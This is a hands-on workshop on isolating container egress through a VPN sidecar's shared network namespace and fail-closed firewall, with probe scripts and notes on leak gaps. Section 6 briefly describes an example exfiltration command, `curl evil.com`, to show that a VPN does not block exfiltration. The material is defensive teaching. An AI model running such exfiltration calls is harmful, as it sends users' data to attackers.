# Workshop: network egress isolation

Hands-on. You'll run an egress probe in three places — your host shell, a default container, and a worker container that shares a VPN sidecar's network namespace — and watch the diff.

The third case demonstrates fail-closed behavior even without VPN credentials, which is the workshop's main lesson. The "actually route through a VPN" part is optional and requires a paid subscription.

## 1. What we're doing and why

Two ideas to internalize before running anything:

**The shared-namespace trick.** Docker lets one container join another container's network namespace via `network_mode: "service:other-container"`. The container that joins doesn't get its own IP, its own routes, its own DNS — it inherits everything from the container it joined. If the *other* container has a VPN tunnel, the joining container's traffic goes through the tunnel automatically.

**The fail-closed pattern.** A correctly-configured VPN sidecar drops all non-tunnel egress at the firewall level. If the tunnel goes down (auth fails, provider unreachable, misconfiguration), the joining container can't fall back to the host's network — there is no host network reachable to it. Traffic stops cold.

These two together let an agent run inside a worker container that *only* exists with respect to a VPN provider. No VPN, no internet. Real VPN, real exit IP. No middle ground where it silently goes direct.

## 2. Run the egress probe on the host (baseline)

```sh
bash <repo>/topics/sandboxing/network-egress/linux/egress-probe.sh
```

The probe checks:
- DNS resolution (`getent hosts example.com`)
- HTTPS reachability via DNS (`curl https://example.com`)
- HTTPS reachability via direct IP (`curl --resolve` to bypass local DNS)
- Your current exit IP (via `https://api.ipify.org`)
- IPv6 reachability
- Raw TCP egress on port 22 to a public host (non-HTTP)
- The state of your `HTTP_PROXY` / `HTTPS_PROXY` / `ALL_PROXY` / `NO_PROXY` env vars

On the host, you'll see most rows reachable, your real exit IP, IPv6 if your network has it. Save the output.

## 3. Run the probe in a default container (no sidecar)

```sh
bash <repo>/topics/sandboxing/network-egress/linux/run-baseline.sh
```

This builds the workshop image (one-time, ~30s) and runs the egress probe inside a fresh Docker container with default networking. You should see roughly the same egress reachability as the host — Docker's default bridge gives the container internet access via NAT. Exit IP is your host's. DNS works via Docker's built-in resolver.

The lesson: **default containers do not isolate egress**. Filesystem yes, network no. To control egress you need an explicit configuration.

## 4. Run the probe through the VPN sidecar (no credentials)

```sh
bash <repo>/topics/sandboxing/network-egress/linux/run-via-sidecar.sh
```

This brings up the docker-compose stack (gluetun + worker), waits for gluetun to attempt setup, runs the probe in the worker, then tears down.

Without VPN credentials in `.env`, gluetun cannot establish a tunnel. Its firewall rules are still in place — block all non-tunnel egress — but there's no tunnel for traffic to use. The worker, sharing gluetun's network namespace, sees:

- DNS: **fail** (no resolver reachable)
- HTTPS to example.com: **fail**
- HTTPS to 1.1.1.1 direct: **fail**
- Exit IP: **fail** (can't reach the IP-detection service)
- IPv6: **fail**
- Raw TCP: **fail**

Everything closed. That is the fail-closed pattern at work — the sidecar isn't routing your traffic, but it also isn't letting your traffic escape.

This is the workshop's main demonstration. You don't need a VPN subscription to see it; you need a misconfigured VPN sidecar (which is what no credentials gives you).

## 5. Going further — with a real VPN subscription

If you have a VPN provider supported by gluetun and want to see the "real" version of this demo:

1. Copy the credentials template:
   ```sh
   cp <repo>/topics/sandboxing/network-egress/linux/.env.example \
      <repo>/topics/sandboxing/network-egress/linux/.env
   ```
2. Fill in the values for your provider. The example uses Mullvad with WireGuard; gluetun's docs cover other providers and protocols.
3. Re-run `run-via-sidecar.sh`.

This time gluetun should succeed. The probe inside the worker should show:

- DNS: **reachable**
- HTTPS: **reachable**
- Exit IP: **the VPN's exit IP** (very different from your host's)
- IPv6: depends on your provider's tunnel config

The exit IP is the headline difference. From the destination's point of view, your traffic is coming from a Mullvad/Proton/Nord exit node, not your home network.

## 6. The OPSEC limit you should not skip

A VPN hides your *identity* (your home IP), not the *fact* you're using a VPN. Mullvad's exit IPs are public knowledge — anyone can fetch the list — and the same is true for every popular provider. A destination that cares can detect you're behind a VPN and refuse service or apply a different policy.

If your threat model is "stop me from being identified to a casual destination," a VPN is enough. If it's "blend in with normal residential traffic," it isn't, and you need a different tool.

This is also relevant for agent contexts: a poisoned exfil that runs `curl evil.com` through a VPN sidecar still reaches `evil.com` — just with a Mullvad-shaped fingerprint. The defense is **fail-closed when the VPN is down**, not "the VPN protects me from exfil." Don't conflate the two.

## 7. Composition with everything we've already built

The full Tier 0 + Tier 2 + network-egress stack for an "evaluate an unfamiliar repo" scenario:

```sh
# Tier 0: scrubbed shell with scoped credentials
cd ~/sandbox-test                    # direnv has loaded the cred-scrub scrubber

# Tier 0 + perimeter: scoped GitHub PAT for this engagement
export GITHUB_TOKEN="$(get-scoped-token)"

# Tier 2: hardened container, with this topic's network-egress sidecar
cd <repo>/topics/sandboxing/network-egress/linux/
docker compose up -d                 # gluetun + worker
docker compose exec -T \
  -e GITHUB_TOKEN \
  worker \
  bash -c 'do-the-thing'              # runs in worker, scoped + hardened + egress-controlled
docker compose down -v
```

That's the talk's "composition over single-tier" framing made concrete: Tier 0 hygiene scopes the host shell, Tier 2 isolates filesystem and capabilities, the sidecar controls egress. Removing any one layer leaves a real gap.

## 8. Honest gaps

- **DNS-over-UDP leaks.** Some setups can leak DNS via UDP-only paths that don't go through the tunnel. Test with `dig +short example.com @8.8.8.8` inside the worker; if it returns an answer when the VPN is down, your sidecar's firewall isn't tight enough.
- **IPv6 leaks.** Many VPNs only tunnel IPv4. If your worker has an IPv6 stack and the host network supports IPv6, traffic can leak around the tunnel. Set `IPV6=off` in gluetun or disable v6 in the worker.
- **The VPN provider sees your traffic.** Encrypted in transit, but the provider is the new endpoint. Trust shifts, doesn't disappear.
- **Provider IPs are enumerable.** See section 6.
- **The agent inside the container can still write to mounted volumes.** Egress control is one axis; FS control is another. Compose them.

## 9. Where to next

`discussion.md` has prompts for your LLM. The composition workshop (when it lands) builds on this topic plus the previous three.
